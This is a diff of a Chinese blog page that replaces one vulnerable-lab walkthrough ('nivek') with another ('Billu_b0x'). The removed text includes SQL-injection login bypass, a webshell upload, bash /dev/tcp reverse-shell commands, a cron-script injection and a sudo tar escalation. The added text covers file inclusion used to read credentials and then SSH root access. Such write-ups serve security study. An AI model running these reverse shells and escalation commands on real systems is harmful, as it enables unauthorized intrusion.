@@ -24,7 +24,7 @@
 
   
 
-  <title>nivek | 可乐加冰</title>
+  <title>Billu_b0x | 可乐加冰</title>
 
   
 
@@ -98,11 +98,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">nivek</h1>
+          <h1 class="title-wrap">Billu_b0x</h1>
           <h2 class="title-sub-wrap">
             <strong>可乐加冰</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2021-12-15T10:12:35.000Z" itemprop="datePublished">2021-12-15</time>
+            <time  class="article-date" datetime="2021-12-23T07:36:19.000Z" itemprop="datePublished">2021-12-23</time>
           </h2>
           <ul class="wrap-list dark">
   
@@ -133,9 +133,7 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p><strong>目标:获取2个flag值</strong><br><strong>1.对靶机端口版本进行探测</strong><br>    <img src="/images/1.png"><br>发现该靶机只有21ftp和22ssh,版本也未找到漏洞,上网查大佬们的博客才发现有个7080web端口<br><strong>2.进行访问是一个后台的登入页面</strong><br>    <img src="/images/2.png"><br>思路:1.用dirb进行爆破查找有没有字典存在2.用万能密码进行sql注入<br> 2.1 进行dirb目录扫描<br>    <img src="/images/3.png"><br>发现只有phpmyadmin数据库后台有用,没有账号密码一样没用啊只能换办法了<br> 2.2 sql注入万能密码注入<br>    <img src="/images/4.png"><br>发现需要有@符号才能进行写入,然后F12查看. 猜测前段代码限制了<br>    <img src="/images/5.png"><br>发现有type限制,把它删除后,在尝试一下万能密码注入进去了后台<br>    <img src="/images/6.png"><br>然后我一个一个按钮点击发现没有一个网页存在漏洞,就想F12查看有没有提示的隐藏文件<br>    <img src="/images/7.png"><br>在这里查看到一个setting.php的一个文件进行访问<br>    <img src="/images/8.png"></p>
-<p><strong>3.Getshell</strong><br>看了一下,有文件上传漏洞,话不多说写一句话木马,然后用burp进行抓包改包进行文件上传<br>    <img src="/images/9.png"><br>这个是文件上传最简单绕过只需要修改image/jpg就行了<br>    <img src="/images/10.png"><br>因为上传是一个php文件不是图片所以会显示不出来,然后右键它复制图像连接,然后用菜刀或者蚁剑连接得到一个shell<br>接下来用bash把shell反弹给kali<br>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.199.128/5555 0&gt;&amp;1’  //用bash把shell给出去<br>在kali上nc -lnvp 5555   //监听自己的端口</p>
-<p><strong>4.提权</strong><br>    <img src="/images/11.png"><br>在/home/local.txt文件中获取第一个flag<br>与此同时在/home目录下发现一个用户为eren想进去看看里面文件发现权限不够 现在就是需要先拿到eren的shell,之后我找了好久目录都没发现什么能提权,之后我就看了大佬的博客<br>输入find / -perm -4000 -type f -exec ls -al {} ; 2&gt;/dev/null可以查看到很多用户文件的权限<br>    <img src="/images/14.png"><br>看到eren用户 有个/usr/bin/bash的文件,然后直接/usr/bin/bash -p就具有eren权限<br>    <img src="/images/15.png"><br>查看/home 目录下eren用户目录<br>    <img src="/images/12.png"><br>思路:脚本文件可以在里面加入一个命令让他运行反弹一个shell命令从而拿到eren用户的shell<br>    <img src="/images/13.png"><br>查看定时任务发现每5分钟会备份一次就是说会运行一次里面指令,刚好符合我之前思路<br>输入echo “bash -i &gt;&amp; /dev/tcp/192.168.3.30/1234 0&gt;&amp;1” &gt;&gt; backup.sh此命令等他5分钟后备份后反弹一个shell<br>    <img src="/images/16.png"><br>同时在kali打开新的命令行nc -lnvp 2000监听等待反弹shell<br>    <img src="/images/17.png"><br>输入sudo -l可以进行提权,接着输入sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh进行提权<br>    <img src="/images/18.png"><br>具有root权限后进入root目录查看flag<br>    <img src="/images/19.png"><br><strong>记一次渗透完成</strong></p>
+        <p><strong>1.探测目标靶机信息.</strong><br><img src="/images/52.png"><br>发现80端口去访问http<br><strong>2.getshell</strong><br><img src="/images/53.png"><br>发现有登入页面尝试万能账号密码进不去,就想着是爆破,爆破需要字典所以推测在网站其他目录里面.<br><img src="/images/54.png"><br>有用的页面只有test和C这.个页面,访问test是有个文件包含的页面,访问C页面是一个空白页面推测用文件包含C页面,in页面是phpinfo敏感信息.<br><img src="/images/55.png"><br><img src="/images/56.png"><br>第一个图片使用get参数包含没有返回就用post参数就可以了   注:burp抓包改post参数需要改头的get变成post 中间添加Content-Type: application/x-www-form-urlencoded 最后需要加入一个post的参数就行了 查看返回值就看到数据库账号密码billu b0x_billu<br>根据前面推测靶机开启了22端口估计是用这个账号密码直连<br><img src="/images/57.png"><br>发现权限不够,那么有数据库账号密码看看有没有phpmy吧<br><img src="/images/58.png"><br>成功进入数据库也看到了账号密码思路立马有了估计是用这个账号密码回到主页进行登入然后里面估计有漏洞要不然人家感觉做一个主页面.<br><img src="/images/59.png"><br>进入后台查看到有文件上传 要么上传木马反弹shell要么就一句话木马然后连接.<br><img src="/images/60.png"><br>这里卡了很久尝试很多绕过都不行,然后用文件包含查看了这里源码他是白名单所以没办法绕过但是我有文件包含啊可以搭配图片码使用所以就上传图片码进行结合.<br><img src="/images/61.png"><br>F12查看前端就看到了图片存放位置.<br>然后在test页面进行文件包含发现包含不了那个文件,然后想了想看看panel.php这个源码吧.<br><img src="/images/62.png"><br>果然在这里有个文件包含那么进行包含图片码<br><img src="/images/63.png"><br>发现用图片码上传后进行包含我的一句话木马呢不见了？？？我懵了,只能想想其他办法了想到phpinfo和phpadmin应该有config.inc.php的文件吧.<br><img src="/images/64.png"><br>我在phpinfo中找到了该in.php的路径那么前面的路径就有/var/www猜测config.inc.php路径在/var/www/phpmy/config.inc.php那里<br><img src="/images/65.png"><br>猜测成功因为phpadmin下肯定有config.inc.php只是就要猜测phpmy前还有没有路径.反正拿到账户密码进行ssh连接就完事了.<br><img src="/images/66.png"><br>呐,直接进去了他ssh没有禁用root登入提权都不用提.</p>
 
       </section>
 
@@ -143,20 +141,20 @@
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2021/12/16/ino/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ino</h2>
+        <a href="/2021/12/17/flag-pcapng/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">flag.pcapng</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
